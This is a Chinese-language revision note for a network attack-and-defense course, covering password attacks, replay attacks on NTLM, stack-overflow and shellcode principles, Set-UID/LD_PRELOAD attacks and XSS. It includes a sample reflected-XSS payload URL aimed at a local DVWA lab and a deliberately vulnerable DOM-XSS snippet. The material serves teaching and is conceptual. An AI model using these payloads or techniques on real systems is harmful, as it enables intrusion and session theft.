<h2 id="针对口令传输的攻击方法"><a href="#针对口令传输的攻击方法" class="headerlink" title="针对口令传输的攻击方法"></a>针对口令传输的攻击方法</h2><h3 id="嗅探攻击"><a href="#嗅探攻击" class="headerlink" title="嗅探攻击"></a>嗅探攻击</h3><img src="网络攻防技术复习.assets/image-20231221161225246.png" alt="image-20231221161225246" style="zoom: 33%;" />

<p>嗅探的前提条件：运行嗅探器的主机和被监听的主机必须在同一个以太网段上。</p>
<ul>
<li><p>以太网是一种使用广播信道的网络，在以太网中所有通信都是广播的。</p>
</li>
<li><p>嗅探器将系统的网络接口设置为混杂模式，可以监听所有流经同一以太网网段的数据包。</p>
</li>
</ul>
<p>网卡的侦听模式：</p>
<ul>
<li>广播模式</li>
<li>组播模式</li>
<li>普通模式</li>
<li>混杂模式</li>
</ul>
<br>

<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>硬件截获：修改主机的键盘接口（PS&#x2F;2 或者 USB），使之在向主机传递I&#x2F;O数据的同时，将信息发送给攻击者</p>
<p>软件截获：监视操作系统处理键盘输入的接口，将来自键盘的数据记录下来（Hook技术）</p>
<br>

<h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h3><p>英文：Phishinig</p>
<p>攻击者利用欺骗性的电子邮件和伪造的 Web 站点，骗取用户输入口令以及其他身份敏感信息。</p>
<br>

<h3 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h3><p>在信息系统中，通信的双方在使用口令进行身份验证时，为了防止嗅探攻击，通常不直接发送明文口令进行认证，而是利用口令，按照一定的认证协议和加密算法进行认证。</p>
<p>定义：攻击者记录下当前的通讯流量，以后在适当的时候重发给通讯的某一方，达到欺骗的目的。</p>
<blockquote>
<p>介绍：« 挑战 &#x2F; 响应 »方式 （CR方式）</p>
<p>以 Windows 系统的 NTLM 认证过程为例：</p>
<ol>
<li>用户在客户机上提供用户名和口令，系统计算口令的 NTLM 散列值，然后把口令丢掉。</li>
<li>客户机以明文方式把用户名发送给服务器。</li>
<li>服务器产生一个128位随机数（称之为<strong>挑战</strong>，Challenge），并发送给客户机。</li>
<li>客户机用 NTLM 散列作为密钥，加密随机数，并把结果送回给服务器，产生<strong>应答</strong>（Response）。</li>
<li>服务器通过用户名从 SAM 数据库得到用户口令的 NTLM 散列，用这个值作为密钥加密 Challenge，并将加密后的结果和 Response 作比较，如果相等则认证成功；否则则认证失败。</li>
</ol>
</blockquote>
<br>

<p>具体过程：</p>
<ol>
<li>主机 A 向主机 B 发出资源访问请求，B 返回给 A 一个挑战值 Challenge。</li>
<li>由于 A 没有 B 的合法帐号，因此无法计算响应值 Response，此时 A 暂时将会话挂起，等待机会。</li>
<li>在某一时刻，B 向 A 发出了资源访问请求，于是 A 将前面获得的 Challenge 作为自己的挑战值发送给 B。</li>
<li>B 计算出 Response，返回给 A。</li>
<li>现在，A 拥有了正确的 Response，它可以继续进行在第一步中暂时挂起的会话。</li>
</ol>
<br>

<p>分类：</p>
<ul>
<li>直接重放：常见于接口安全，将上次的 token 重放，一般使用时间戳+随机数的方式（如阿里云），有效期外直接判断为重放，有效期内通过随机数判断重放，这样服务器只用保存有效期内的随机数（比如在 redis 中设置过期时间），节省了资源；可以使用质询的方式，就是比较麻烦。</li>
<li>反向重放：如果通信双方采用的是对称加密，攻击者可以作为中间人将一方发来的加密后的 challenge 发给另一方让他用密钥解密。</li>
</ul>
<br>

<br>

<h2 id="口令攻击的防范方法"><a href="#口令攻击的防范方法" class="headerlink" title="口令攻击的防范方法"></a>口令攻击的防范方法</h2><p>选择安全密码：</p>
<ul>
<li>设置足够长度的口令</li>
<li>口令中混合使用大小写字母、数字、特殊符号</li>
</ul>
<p>防止口令猜测攻击：</p>
<ul>
<li>硬盘分区采用 NTFS 格式</li>
<li>正确设置和管理账户</li>
<li>关闭不需要的服务</li>
<li>关闭不用的端口</li>
</ul>
<p>设置安全策略</p>
<br>

<br>

<br>

<h1 id="软件漏洞"><a href="#软件漏洞" class="headerlink" title="软件漏洞*"></a>软件漏洞*</h1><h2 id="漏洞的定义"><a href="#漏洞的定义" class="headerlink" title="漏洞的定义"></a>漏洞的定义</h2><p>指信息系统硬件、软件、操作系统、网络协议、数据库等在设计上、实现上出现的可以被攻击者利用的错误、缺陷和疏漏。</p>
<p>通俗一点说，漏洞就是<strong>可以被攻击利用的系统弱点</strong>。</p>
<blockquote>
<p>CWE是一种通用弱点枚举分类标准，描述和识别软件中存在的常见弱点，比如缓冲区溢出、代码注入、格式字符串漏洞等。</p>
<p>CVE则是一种公共漏洞标识符，用于唯一标识已知的安全漏洞，是具体利用的漏洞，如永恒之蓝等。</p>
</blockquote>
<br>

<br>

<h2 id="典型漏洞类型"><a href="#典型漏洞类型" class="headerlink" title="典型漏洞类型"></a>典型漏洞类型</h2><p>栈溢出（Stack Overflow）</p>
<p>堆溢出（Heap Overflow）</p>
<p>格式化串（Format String）</p>
<p>整型溢出（Integer Overflow）</p>
<p>释放再使用（Use after Free）</p>
<br>

<br>

<h2 id="栈溢出漏洞利用原理"><a href="#栈溢出漏洞利用原理" class="headerlink" title="栈溢出漏洞利用原理*"></a>栈溢出漏洞利用原理*</h2><p><em>内存分布、<strong>漏洞利用内存变化、压栈 &#x2F; 出栈、栈溢出原理</strong></em></p>
<br>

<h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理*"></a>栈溢出原理*</h3><p>当程序运行时，计算机会在内存区域中开辟一段连续的内存块，包括<strong>代码段</strong>、<strong>数据段</strong>和<strong>堆栈段</strong>三部分。</p>
<img src="网络攻防技术复习.assets/image-20231221194243521.png" alt="image-20231221194243521" style="zoom: 50%;" />

<br>

<p>程序在内存中的存放形式</p>
<img src="网络攻防技术复习.assets/image-20231221194421626.png" alt="image-20231221194421626" style="zoom:50%;" />

<p><strong>内存分布</strong>：代码段、数据段、堆栈段</p>
<ul>
<li><p>代码段（.text），也称文本段（Text Segment）</p>
<ul>
<li>存放着程序的机器码和只读数据，可执行指令就是从这里取得的，这个段在内存中一般被标记为只读，任何对该区的写操作都会导致段错误（Segmentation Fault）。</li>
</ul>
</li>
<li><p>数据段（在编译时分配），包括：</p>
<ul>
<li>已初始化的数据段（.data）<ul>
<li>存放保存全局的和静态的已初始化变量</li>
</ul>
</li>
<li>未初始化的数据段（.bss）<ul>
<li>保存全局的和静态的未初始化变量</li>
</ul>
</li>
</ul>
</li>
<li><p>堆栈段：堆 &amp;&amp; 栈</p>
<ul>
<li>堆（Heap）：位于 BSS 内存段的上边，用来存储程序运行时分配的变量。<ul>
<li>堆的大小并不固定，可动态扩张或缩减。其分配由 malloc()、new() 等这类实时内存分配函数来实现。当进程调用malloc 等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用 free() 等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）。</li>
<li>堆的内存释放由应用程序去控制，通常一个 new() 就要对应一个 delete() ，如果程序员没有释放掉，那么在程序结束后操作系统会自动回收。 </li>
<li>从低地址向高地址增长</li>
</ul>
</li>
<li>栈（Stack）：在函数调用时产生，是一种用来存储函数调用时的临时信息的结构，如<strong>函数调用所传递的参数、函数的返回地址、函数的局部变量</strong>等。<ul>
<li>从高地址向低地址增长</li>
<li>在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除</li>
<li>栈的特性：先入后出（FILO）</li>
<li>基本操作：<ul>
<li>Push：向栈中添加数据，称为压栈，数据将放置在栈顶。</li>
<li>Pop：POP操作相反，在栈顶部移去一个元素，并将栈的大小减一，称为弹栈。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231221200439358.png" alt="image-20231221200439358" style="zoom: 50%;" />

<blockquote>
<p>程序内存由高到低：环境变量及命令行参数——&gt;栈——&gt;堆——&gt;未初始化全局或静态变量&#x2F;.bss——&gt;初始化全局或静态变量&#x2F;.data——&gt;程序指令和只读数据&#x2F;.text</p>
<p>栈中内存由高到低：父函数传入子函数的参数（32位，64位使用寄存器传参）——&gt;子函数的返回地址——&gt;父函数的ebp——&gt;子函数的局部变量</p>
</blockquote>
<br>

<ul>
<li><p>随着函数调用层数的增加，<strong>函数栈帧</strong>是一块块地向内存<strong>低地址</strong>方向延伸的。</p>
</li>
<li><p>随着进程中函数调用层数的减少，即各函数调用的返回，栈帧会一块块地被遗弃而向内存的高址方向回缩。</p>
</li>
<li><p>各函数的栈帧大小随着函数的性质的不同而不等，由函数的局部变量的数目决定。</p>
</li>
<li><p>在溢出中，我们主要关注数据区和堆栈区。</p>
</li>
</ul>
<br>

<p>在使用栈时，引用栈帧需要借助两个寄存器：</p>
<ul>
<li>SP（ESP），即<strong>栈顶指针</strong><ul>
<li><strong>永远指向系统栈最上面一个栈帧的栈顶</strong>，随着数据入栈出栈而发生变化。</li>
</ul>
</li>
<li>BP（EBP），即<strong>基地址指针</strong><ul>
<li><strong>指向栈帧的底部，</strong>它用于标识栈中一个相对稳定的位置，通过 BP，再加上偏移地址，可以方便地引用函数参数以及局部变量。</li>
</ul>
</li>
</ul>
<br>

<p>函数被调用的时候，栈中的压入情况如下：</p>
<img src="网络攻防技术复习.assets/image-20231221203743577.png" alt="image-20231221203743577" style="zoom: 67%;" />

<p>局部变量1、局部变量2依次向低地址增长。数组是特例，数字的第一个元素往往在最低地址的地方。（数组的位置指的也是第一个元素的地址）</p>
<p>在局部变量的下面（下面指的是高地址），是前一个调用函数的 EBP，接下来就是返回地址。</p>
<p>如果局部变量发生溢出，很有可能会覆盖掉 EBP 甚至 RET（返回地址），这就是缓冲区溢出攻击的« 奥秘 »所在。</p>
<br>

<p><strong>栈溢出原理</strong>：如果在堆栈中压入的数据超过预先给堆栈分配的容量时，就会出现堆栈溢出，从而使得程序运行失败；如果发生溢出的是大型程序还有可能会导致系统崩溃。</p>
<br>

<p>程序中发生函数调用时，计算机做如下操作：</p>
<ol>
<li><p>首先把指令寄存器 EIP（它指向当前 CPU 将要运行的下一条指令的地址）中的内容压入栈，作为程序的返回地址（ RET ）</p>
</li>
<li><p>之后放入栈的是基址寄存器 EBP，它指向当前函数栈帧（stack frame）的底部</p>
</li>
<li><p>然后把 EBP 修改为当前的栈指针 ESP 的值，作为新的基地址</p>
</li>
<li><p>最后为本地变量的动态存储分配留出一定空间，并把 ESP 减去适当的数值</p>
</li>
</ol>
<br>

<br>

<h2 id="溢出漏洞利用原理"><a href="#溢出漏洞利用原理" class="headerlink" title="溢出漏洞利用原理*"></a>溢出漏洞利用原理*</h2><p><em>基本流程，<strong>关键技术</strong></em></p>
<br>

<h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol>
<li>注入恶意数据</li>
<li>溢出缓冲区</li>
<li>控制流重定向</li>
<li>执行有效载荷</li>
</ol>
<br>

<br>

<h3 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术*"></a>关键技术*</h3><h4 id="溢出点定位"><a href="#溢出点定位" class="headerlink" title="溢出点定位"></a>溢出点定位</h4><p>如何确定溢出点位置？</p>
<ul>
<li>探测法<ul>
<li>构造数据，根据出错的情况来判断。</li>
</ul>
</li>
<li>反汇编分析</li>
</ul>
<br>

<h4 id="覆盖执行控制地址"><a href="#覆盖执行控制地址" class="headerlink" title="覆盖执行控制地址"></a>覆盖执行控制地址</h4><p>覆盖执行控制地址可包括：</p>
<ul>
<li>覆盖返回地址</li>
<li>覆盖函数指针变量</li>
<li>覆盖异常处理结构</li>
</ul>
<br>

<h4 id="覆盖异常处理结构"><a href="#覆盖异常处理结构" class="headerlink" title="覆盖异常处理结构"></a>覆盖异常处理结构</h4><p>异常处理是一种对程序异常的处理机制，它把错误处理代码与正常情况下所执行的代码分开。</p>
<p>当程序发生异常时，系统中断当前线程，将控制权交给异常处理程序。</p>
<p>Windows 的异常处理机制称为结构化异常处理（Structured Exception Handling）。</p>
<br>

<h4 id="跳转地址的确定"><a href="#跳转地址的确定" class="headerlink" title="跳转地址的确定"></a>跳转地址的确定</h4><p>跳转指令的选取</p>
<ul>
<li>jmp esp、call ebx、call ecx等</li>
</ul>
<br>

<p>跳转指令的搜索范围</p>
<ul>
<li>用户空间的任意地址、系统dll、进程代码段、PEB、TEB</li>
<li>跳转指令地址的选择规律</li>
</ul>
<br>

<h4 id="Shellcode-的定位和跳转"><a href="#Shellcode-的定位和跳转" class="headerlink" title="Shellcode 的定位和跳转"></a>Shellcode 的定位和跳转</h4><img src="网络攻防技术复习.assets/image-20231223183720287.png" alt="image-20231223183720287" style="zoom: 50%;" />

<ul>
<li>NOP Sled：类 NOP 指令填充，可以是 NOP，也可以是inc eax 等无副作用指令。</li>
<li>Decoder：解码部分，对 Real_Shellcode 解码。</li>
<li>Real_Shellcode：真正有意义的 shellcode 部分，但是经过了编码处理。</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231223185040719.png" alt="image-20231223185040719" style="zoom: 50%;" />

<br>

<br>

<h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p><em>定义，作用，如何编写步骤，需要注意事项，通用 Shellcode 编写方法</em></p>
<br>

<h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>ShellCode 就是一段能够完成一定功能（比如打开一个命令窗口）、可直接由计算机执行的机器代码，通常以<strong>十六进制</strong>的形式存在。</p>
<p>e.g：</p>
<img src="网络攻防技术复习.assets/image-20231223185335655.png" alt="image-20231223185335655" style="zoom: 33%;" />

<br>

<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>(1) 可以是处于恶作剧弹出对话框</p>
<p>(2) 打开 dos 窗口（执行任意程序）</p>
<p>(3) 添加系统管理用户</p>
<p>(4) 打开可以远程连接的端口</p>
<p><strong>(5) 发起反向连接</strong></p>
<p><strong>(6) 上传（下载）木马病毒并运行</strong></p>
<p>(7) 可能是攻击性的，删除重要文件、窃取数据</p>
<p>(8) 破坏，格式化磁盘</p>
<p>……</p>
<br>

<h3 id="如何编写"><a href="#如何编写" class="headerlink" title="如何编写"></a>如何编写</h3><p>例如编写一个打开 windows 对话框的 Shellcode</p>
<ol>
<li>编写打开 windows 对话框的 C 程序</li>
<li>Windows 函数调用原理</li>
<li>使用汇编生成 Shellcode（机器码\x55）</li>
</ol>
<br>

<ol>
<li>编写打开 windows 对话框的 C 程序</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>,</span><br><span class="line">              <span class="string">&quot;网络攻防ShellCode测试！&quot;</span>,</span><br><span class="line">              <span class="string">&quot;网络安全&quot;</span>,</span><br><span class="line">              MB_OK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>Windows 函数调用原理：</p>
<ul>
<li>加载（LOAD）函数所在的动态链接库</li>
<li>使用堆栈进行参数传递</li>
<li>调用（CALL）函数地址</li>
</ul>
<p>e.g：在 Windows 下执行 Func（argv1，argv2，argv3）</p>
<ul>
<li>将argv3，argv2，argv1 压入堆栈</li>
<li>在 32 位的汇编中，参数通常是以 stdcall 调用约定传递的，所以参数的顺序是从右往左依次压栈</li>
<li>调用函数地址（Push EIP，JUMP FUNC）</li>
</ul>
</blockquote>
<br>

<ol start="2">
<li>使用汇编生成 ShellCode</li>
</ol>
<p>继续前面的例子：如何把 MessageBox 写成汇编？</p>
<p>思路：</p>
<ol>
<li><p>将« 参数 »压栈</p>
</li>
<li><p>将« 参数 »地址压栈</p>
</li>
<li><p>Call MessageBox 函数地址</p>
</li>
</ol>
<br>

<p>注意：Push 是 4 个字节对齐的（32位），因此必须每次压栈 4 个字节或者 1 个字节 1 个字节地赋值</p>
<img src="网络攻防技术复习.assets/image-20231224125413912.png" alt="image-20231224125413912" style="zoom: 50%;" />

<br>

<ol start="3">
<li>写成汇编之后，再把机器码抄下来，就是 ShellCode。</li>
</ol>
<br>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>正常退出</p>
<ul>
<li>process：用 ExitProcess()</li>
<li>SEH：强制产生一个异常调用（可能会使 exploit 代码不停运行）</li>
<li>thread：用 ExitThread()</li>
</ul>
<br>

<p>处理 null 字节</p>
<ul>
<li><p>可替代指令 &amp; 指令编码</p>
<ul>
<li>用 add &amp; sub 来重新产生原来的值</li>
<li>sniper：precision - null - byte - boming</li>
<li>将原始值一字节一字节写入</li>
<li>xor</li>
<li>寄存器：32位 -&gt; 16位 -&gt; 8位</li>
<li>用可替代指令</li>
<li>从 null 字节到 空格&amp;null 字节</li>
</ul>
</li>
<li><p>编码器：payload 编码</p>
</li>
</ul>
<br>

<p>加载 dll</p>
<br>

<h3 id="通用ShellCode编写方法"><a href="#通用ShellCode编写方法" class="headerlink" title="通用ShellCode编写方法"></a>通用ShellCode编写方法</h3><p>将每个版本的 Windows 操作系统所对应的函数地址列出来，然后针对不同版本的操作系统使用不同的地址。</p>
<p>动态定位函数地址</p>
<ul>
<li>即使用 GetProcAddress 和 LoadLibrary 函数动态获取其他函数的地址</li>
</ul>
<img src="网络攻防技术复习.assets/image-20231224143956520.png" alt="image-20231224143956520" style="zoom:50%;" />

<br>

<p>如何获取 GetProcAddress 和 LoadLibrary 的地址：</p>
<ul>
<li><p>暴力搜索</p>
</li>
<li><p>使用 PEB 获取 GetProcAddress 地址</p>
</li>
<li><p>SHE 获得 kernel 基址</p>
</li>
<li><p>HASH 法查找所有函数地址</p>
</li>
</ul>
<br>

<br>

<br>

<h2 id="环境变量攻击"><a href="#环境变量攻击" class="headerlink" title="环境变量攻击"></a>环境变量攻击</h2><p><em>原理、Set-UID概念、攻击案例分析</em></p>
<br>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>隐藏使用环境变量很危险。</p>
<p>由于用户可以设置环境变量，因此它们将成为 Set-UID 程序的攻击面的一部分。</p>
<img src="网络攻防技术复习.assets/image-20231224174303429.png" alt="image-20231224174303429" style="zoom: 50%;" />



<h3 id="Set-UID"><a href="#Set-UID" class="headerlink" title="Set-UID"></a>Set-UID</h3><p>概念：</p>
<ul>
<li>允许用户以程序所有者的权限运行程序。</li>
<li>允许用户以临时提升的权限运行程序。</li>
</ul>
<br>

<p>每个进程都有两个用户ID</p>
<ul>
<li><p>Real UID（RUID）：确定进程的真正所有者。</p>
</li>
<li><p>Effective UID（EUID）：表示进程的权限</p>
<blockquote>
<p>访问控制是基于 EUID 的</p>
</blockquote>
</li>
<li><p>当执行正常程序时，RUID &#x3D; EUID，他们都等于运行程序的用户的 ID</p>
</li>
<li><p>当执行 Set-UID 时，RUID ≠ EUID，RUID 还是用户 ID，但是 EUID 是程序 owner 的 ID</p>
<blockquote>
<p>如果程序归 root 所有，则程序以 root 权限运行</p>
</blockquote>
</li>
</ul>
<br>

<br>

<h3 id="攻击案例分析"><a href="#攻击案例分析" class="headerlink" title="攻击案例分析"></a>攻击案例分析</h3><h4 id="通过动态链接器攻击"><a href="#通过动态链接器攻击" class="headerlink" title="通过动态链接器攻击"></a>通过动态链接器攻击</h4><p>动态使用环境变量，所以它将成为攻击面的一部分。</p>
<p>动态链接指向在程序中引用的外部库代码，这意味着程序在编译期间未决定部分代码。</p>
<p>如果用户可以影响那部分代码，它们可能会损害程序的完整性。</p>
<br>

<p>案例：</p>
<p>环境变量 LD_PRELOAD 包含一个共享库的列表，链接器将首先搜索它。如果没有找到所有函数，链接器将在几个文件夹列表中搜索，包括 LD_LIBRARY_PATH 指定的文件夹。</p>
<p>这两个变量都可以由用户设置，因此使他们有机会控制链接过程结果。</p>
<blockquote>
<p>如果该程序是一个Set-UID程序，它可能会导致安全漏洞。</p>
</blockquote>
<p>对策：</p>
<p>动态连接器实现了一个对策。当 EUID 和 RUID 不同时，它会忽略 LD_PRELOAD 和 LD_LIBRARY_PATH 环境变量。</p>
<br>

<h4 id="通过外部程序-x2F-库攻击"><a href="#通过外部程序-x2F-库攻击" class="headerlink" title="通过外部程序&#x2F;库攻击"></a>通过外部程序&#x2F;库攻击</h4><p>应用程序可以调用外部程序。</p>
<p>应用程序本身可能不使用环境变量，但被调用的外部程序可能会使用。</p>
<p>例如 system 调用 execve()，其中的参数涉及 PATH</p>
<br>

<p>通过外部库攻击：程序通常使用来自外部库的函数。</p>
<p>如果这些函数使用环境变量，则它们会添加到攻击表面。</p>
<blockquote>
<p>攻击表面（Attack Surface）是指系统或程序对潜在攻击的脆弱性和暴露程度。简而言之，攻击表面越大，系统或程序受到的威胁越多，因为攻击者有更多的机会发现漏洞并进行攻击。</p>
</blockquote>
<br>

<h4 id="通过应用程序代码的攻击"><a href="#通过应用程序代码的攻击" class="headerlink" title="通过应用程序代码的攻击"></a>通过应用程序代码的攻击</h4><p>程序可以直接使用环境变量。如果这些是特权程序，它可能会导致不可信任的输入。</p>
<br>

<h4 id="Set-UID方法-x2F-服务方法"><a href="#Set-UID方法-x2F-服务方法" class="headerlink" title="Set-UID方法&#x2F;服务方法"></a>Set-UID方法&#x2F;服务方法</h4><img src="网络攻防技术复习.assets/image-20231225141349058.png" alt="image-20231225141349058" style="zoom: 45%;" />

<p>大多数操作系统都采用两种方法，以允许正常用户执行特权操作</p>
<ul>
<li><p>Set-UID方法：普通用户必须运行一个特殊的程序（设置了 Set-UID 的可执行程序）才能临时获得 root 权限（通常是 root 权限）</p>
</li>
<li><p>服务方法：普通用户必须请求特权服务才能为他们执行操作</p>
</li>
</ul>
<p>Set-UID具有更广泛的攻击面，这是由环境变量引起的</p>
<ul>
<li><p>在 Set-UID 方法中不能信任环境变量</p>
</li>
<li><p>在服务方法可以信任环境变量</p>
</li>
</ul>
<p>尽管其他攻击面仍然适用于服务方法，但它被认为比 Set-UID 方法更安全</p>
<blockquote>
<p>因此，安卓操作系统完全删除了 Set-UID 和 Set-GID 机制</p>
</blockquote>
<br>

<br>

<br>

<h1 id="Web-应用攻击"><a href="#Web-应用攻击" class="headerlink" title="Web 应用攻击*"></a>Web 应用攻击*</h1><h2 id="Web-应用结构"><a href="#Web-应用结构" class="headerlink" title="Web 应用结构"></a>Web 应用结构</h2><p><em>架构、基本内容</em></p>
<br>

<h3 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h3><p>Web 客户端（浏览器）————HTTP 协议————Web 服务器（Web 网页、数据库）</p>
<img src="网络攻防技术复习.assets/image-20231225142615551.png" alt="image-20231225142615551" style="zoom: 67%;" />

<br>

<h3 id="基本内容"><a href="#基本内容" class="headerlink" title="基本内容"></a>基本内容</h3><p>Web 网页：Web 网页位于 Web 服务器上，用于展示信息，一般采用 HTML 语言（Hypertext Markup Language）编写。</p>
<ul>
<li><p>统一资源定位符（URL）：<code>http://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;?&lt;query&gt;#&lt;frag&gt;</code></p>
</li>
<li><p>Form表单</p>
</li>
</ul>
<blockquote>
<p>静态网页：静态网页是指内容固定，不会根据 Web 客户端请求的不同而改变的 Web 网页</p>
<p>动态网页：动态网页是相对应静态网页而言的，是指内容会根据时间、环境或者用户输入的不同而改变的 Web 网页</p>
</blockquote>
<p>Web 服务器（主流）：Apache、Nginx、IIS、Tomcat</p>
<p>Web 客户端（浏览器）：Chrome、Firefox、IE（Edge）</p>
<p>目前最流行的HTTP协议版本是 HTTP1.1</p>
<p>请求头结构：</p>
<ul>
<li>请求行：包括方法、URL和协议版本</li>
<li>请求头部：包括通用头部、请求头部和实体头部</li>
<li>空行（CRLF）</li>
<li>请求数据（对于POST请求）</li>
</ul>
<p>响应头结构：</p>
<ul>
<li>状态行：包括协议版本、状态码和状态短语</li>
<li>响应头部：包括通用头部、响应头部和实体头部</li>
<li>空行（CRLF）</li>
<li>实体主体：包括响应内容</li>
</ul>
<blockquote>
<p>实体首部字段是HTTP消息头的一部分，用于描述消息主体的内容、类型和长度等信息。常见的实体首部字段包括Content-Type（描述实体主体的媒体类型）、Content-Length（描述实体主体的长度）等。</p>
</blockquote>
<br>

<h3 id="Web-应用攻击类型"><a href="#Web-应用攻击类型" class="headerlink" title="Web 应用攻击类型"></a>Web 应用攻击类型</h3><p>Web 客户端攻击（攻击用户）</p>
<ul>
<li>跨站脚本攻击（Cross-Site Scripting，简称 XSS 攻击）、网络钓鱼和网页挂马</li>
</ul>
<p>Web 服务器攻击</p>
<ul>
<li>网页篡改、代码注入攻击、文件操作控制攻击等</li>
<li>HTTP 头注入攻击、HTTP 会话攻击</li>
</ul>
<br>

<br>

<h2 id="XSS-攻击"><a href="#XSS-攻击" class="headerlink" title="XSS 攻击*"></a>XSS 攻击*</h2><p><em>定义、同源策略、<strong>危害、代码漏洞分析及利用方法、类型、防范措施</strong></em></p>
<br>

<h3 id="定义-amp-同源策略"><a href="#定义-amp-同源策略" class="headerlink" title="定义 &amp; 同源策略"></a>定义 &amp; 同源策略</h3><p>跨站脚本攻击出现在上世纪90年代中，由于跨站脚本攻击的缩写和层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防止混淆，故缩写成 XSS 攻击。</p>
<p>定义：XSS 攻击是由于 Web 应用程序对用户输入过滤不足而产生的，使得攻击者输入的特定数据变成了 JavaScript 脚本或 HTML 代码。</p>
<br>

<p>同源策略：A网页设置的 Cookie，B 网页不能打开，除非这两个网页 « 同源 »。所谓 « 同源 » 指的是 « 三个相同 »。</p>
<ul>
<li>协议相同、域名相同、端口相同</li>
</ul>
<br>

<br>

<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>(1) 网络钓鱼，包括盗取各类用户账号 </p>
<p>(2) 窃取用户 cookies 资料，从而获取用户隐私信息，或利用好用户身份进行一部对网站执行操作</p>
<p>(3) 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、发送电子邮件等</p>
<p>(4) 强制弹出广告页面、刷流量等； </p>
<p>(5) 网页挂马 </p>
<p>(6) 进行恶意操作，例如任意篡改页面信息、删除文章等；</p>
<p>(7) 进行大量的客户端攻击，如 DDoS 攻击； </p>
<p>(8) 提取客户端信息，例如用户的浏览历史、真实 IP、开放端口等； </p>
<p>(9) 控制受害者机器向其它网站发起攻击； </p>
<p>(10) 结合其他漏洞，如 CSRF 漏洞，实施进一步作恶； </p>
<p>(11) 提升用户权限，包括进一步渗透网站； </p>
<p>(12) 传播跨站脚本蠕虫；</p>
<br>

<br>

<h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ol>
<li><p>反射型 XSS（Reflected Cross-site Scripting）</p>
</li>
<li><p>存储型 XSS（Persistent Cross-site Scripting）</p>
</li>
<li><p>DOM 型 XSS（）</p>
</li>
</ol>
<br>

<h4 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a>反射型 XSS</h4><p>非持久性、参数型跨站脚本</p>
<p>恶意 payload 经过后端，但没有存入后端数据库，比如服务器将GET或POST参数回显在前端</p>
<p>技巧：将含有 payload 的URL变成短网址，隐藏恶意参数，欺骗用户访问短网址</p>
<p><code>http://192.168.220.128/dvwa/vulnerabilities/xss_r/?name=&lt;script&gt; alert(/xss/)&lt;/script&gt;</code></p>
<p>工作流程：<img src="网络攻防技术复习.assets/image-20231225152429831.png" alt="image-20231225152429831" style="zoom: 67%;" /></p>
<br>

<h4 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h4><p>持久型</p>
<p>恶意 payload 经过后端并且存入后端数据库，持久化存储</p>
<p>一般攻击存在留言、评论、博客日志等中</p>
<p>工作流程：<img src="网络攻防技术复习.assets/image-20231225152649710.png" alt="image-20231225152649710" style="zoom:67%;" /></p>
<br>

<h4 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h4><p>DOM XSS是基于在 js 上的，不需要与服务端进行交互</p>
<p>恶意 payload 不经过后端，而是针对 js 进行攻击，直接改变前端 DOM树</p>
<blockquote>
<p>DOM 是 Document Object Model（文档对象模型）的缩写。它是一种对文档的逻辑结构和内容进行抽象表达的方式，通常用于表示和操作HTML、XML等文档的标准</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将URL中name参数的值显示在前端</span></span><br><span class="line"><span class="keyword">var</span> pos=<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;name=&quot;</span>)+<span class="number">5</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="title function_">substring</span>(pos,<span class="variable language_">document</span>.<span class="property">URL</span>.<span class="property">length</span>)</span><br></pre></td></tr></table></figure>

<p>工作流程：<img src="网络攻防技术复习.assets/image-20231225153039092.png" alt="image-20231225153039092" style="zoom:67%;" /></p>
<br>

<br>

<h3 id="XSS-攻击利用方式"><a href="#XSS-攻击利用方式" class="headerlink" title="XSS 攻击利用方式"></a>XSS 攻击利用方式</h3><p>Cookie 窃取</p>
<br>

<p>会话劫持：攻击者通过 XSS 攻击，冒用合法者的会话 ID 进行网络访问的一种攻击方式</p>
<ul>
<li>会话 ID：由 Web 客户端提供给服务器以表示同一个会话，一般采用 Cookie 方式或 URL 方式传递。会话数据则一般保存在 Web 服务器，用于 Web 应用程序之间信息传递</li>
</ul>
<br>

